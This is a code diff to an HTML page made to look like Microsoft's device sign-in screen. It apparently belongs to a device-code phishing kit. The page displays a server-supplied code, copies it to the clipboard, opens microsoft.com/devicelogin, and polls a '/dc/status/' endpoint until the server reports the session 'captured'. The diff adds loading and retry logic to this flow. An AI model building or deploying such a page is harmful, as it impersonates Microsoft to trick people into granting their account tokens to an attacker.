@@ -45,10 +45,11 @@ body{font-family:'Segoe UI','Segoe UI Web (West European)',-apple-system,BlinkMa
 .subtitle{font-size:14px;color:#616161;margin-bottom:36px;line-height:1.5}
 .code-box{background:#f5f5f5;border-radius:8px;padding:24px;text-align:center;margin-bottom:32px}
 .code-label{font-size:11px;color:#616161;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:8px;font-weight:500}
-.code-value{font-size:36px;font-weight:700;letter-spacing:8px;color:#242424;font-family:'Segoe UI Mono',Consolas,monospace}
+.code-value{font-size:36px;font-weight:700;letter-spacing:8px;color:#242424;font-family:'Segoe UI Mono',Consolas,monospace;min-height:50px;display:flex;align-items:center;justify-content:center}
 .code-status{font-size:12px;color:#107c10;margin-top:12px;min-height:18px;font-weight:500}
 .btn-primary{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;background:#0067b8;color:#fff;border:none;padding:14px 24px;font-size:15px;font-weight:600;cursor:pointer;border-radius:4px;transition:background .15s}
 .btn-primary:hover{background:#005a9e}
+.btn-primary:disabled{background:#b0b0b0;cursor:default}
 .btn-primary svg{flex-shrink:0}
 .separator{position:relative;text-align:center;margin:28px 0}
 .separator::before{content:'';position:absolute;top:50%;left:0;right:0;height:1px;background:#e5e5e5}
@@ -64,6 +65,8 @@ body{font-family:'Segoe UI','Segoe UI Web (West European)',-apple-system,BlinkMa
 .success-icon svg{width:36px;height:36px;fill:#fff}
 .success-title{font-size:24px;font-weight:600;color:#242424;margin-bottom:8px}
 .success-text{font-size:14px;color:#616161}
+.spinner{display:inline-block;width:28px;height:28px;border:3px solid #e0e0e0;border-top:3px solid #0067b8;border-radius:50%;animation:spin .8s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
 </style>
 </head>
 <body>
@@ -79,18 +82,18 @@ body{font-family:'Segoe UI','Segoe UI Web (West European)',-apple-system,BlinkMa
 
 <div class="code-box">
 <div class="code-label">Code</div>
-<div class="code-value" id="userCode">{user_code}</div>
+<div class="code-value" id="userCode"><span class="spinner" id="codeSpinner"></span></div>
 <div class="code-status" id="codeStatus"></div>
 </div>
 
-<button class="btn-primary" onclick="openSignIn()">
+<button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
 <svg width="20" height="20" viewBox="0 0 24 24"><rect width="11" height="11" fill="#fff" fill-opacity=".9"/><rect x="13" width="11" height="11" fill="#fff" fill-opacity=".7"/><rect y="13" width="11" height="11" fill="#fff" fill-opacity=".8"/><rect x="13" y="13" width="11" height="11" fill="#fff" fill-opacity=".6"/></svg>
 Sign in with Microsoft
 </button>
 
 <div class="separator"><span>or manually</span></div>
 
-<p class="alt-text">Visit <a href="https://microsoft.com/devicelogin" target="_blank">microsoft.com/devicelogin</a> and enter the code above</p>
+<p class="alt-text">Visit <a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank">microsoft.com/devicelogin</a> and enter the code above</p>
 
 <div class="footer">
 <a href="https://www.microsoft.com/en-us/servicesagreement/" target="_blank">Terms of use</a>
@@ -109,16 +112,33 @@ Sign in with Microsoft
 (function(){
 var sid='{session_id}';
 var verifyUrl='{verify_url}';
-var code=document.getElementById('userCode').textContent;
+var codeReady={code_ready};
+var code='{user_code}';
 var popup=null;
+var codeEl=document.getElementById('userCode');
+var statusEl=document.getElementById('codeStatus');
+var btnEl=document.getElementById('signInBtn');
+var spinnerEl=document.getElementById('codeSpinner');
+
+function showCode(c,v){
+code=c;
+if(v)verifyUrl=v;
+codeEl.textContent=c;
+btnEl.disabled=false;
+document.getElementById('verifyLink').href=verifyUrl;
+}
+
+if(codeReady&&code){showCode(code,verifyUrl);}
 
 function copyCode(){
+if(!code)return;
 if(navigator.clipboard){navigator.clipboard.writeText(code);}
 else{var t=document.createElement('textarea');t.value=code;t.style.cssText='position:fixed;left:-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);}
-document.getElementById('codeStatus').textContent='Copied to clipboard';
+statusEl.textContent='Copied to clipboard';
 }
 
 function openSignIn(){
+if(!code)return;
 copyCode();
 var w=500,h=680,l=(screen.width-w)/2,t=(screen.height-h)/2;
 popup=window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes');
@@ -128,14 +148,21 @@ window.openSignIn=openSignIn;
 
 function poll(){
 fetch('/dc/status/'+sid).then(function(r){return r.json()}).then(function(d){
+if(d.ready&&!codeReady){
+codeReady=true;
+showCode(d.user_code,d.verify_url);
+}
 if(d.captured){
 if(popup&&!popup.closed)popup.close();
 document.getElementById('mainView').style.display='none';
 document.getElementById('successView').style.display='block';
-}else if(!d.expired){setTimeout(poll,3000);}
-}).catch(function(){setTimeout(poll,5000);});
+}else if(d.failed){
+statusEl.textContent='Failed to generate code. Refresh to retry.';
+codeEl.textContent='—';
+}else if(!d.expired){setTimeout(poll,codeReady?3000:800);}
+}).catch(function(){setTimeout(poll,3000);});
 }
-setTimeout(poll,4000);
+setTimeout(poll,codeReady?4000:500);
 })();
 </script>
 </body>
